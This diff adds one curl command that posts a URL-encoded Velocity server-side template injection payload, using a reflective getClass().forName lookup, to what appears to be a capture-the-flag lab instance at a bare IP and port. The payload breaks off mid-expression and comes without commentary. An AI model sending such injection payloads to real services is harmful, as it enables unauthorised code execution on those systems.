@@ -1,0 +1,13 @@
+curl 'http://94.237.49.147:41947/' \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+  -H 'Accept-Language: en-US,en;q=0.9' \
+  -H 'Cache-Control: max-age=0' \
+  -H 'Connection: keep-alive' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'DNT: 1' \
+  -H 'Origin: http://94.237.49.147:41947' \
+  -H 'Referer: http://94.237.49.147:41947/' \
+  -H 'Upgrade-Insecure-Requests: 1' \
+  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0' \
+  --data-raw 'text=%23set%28%24class+%3D+%24name.getClass%28%29.forName%28%22Main%22%29%29+%24class.' \
+  --insecure
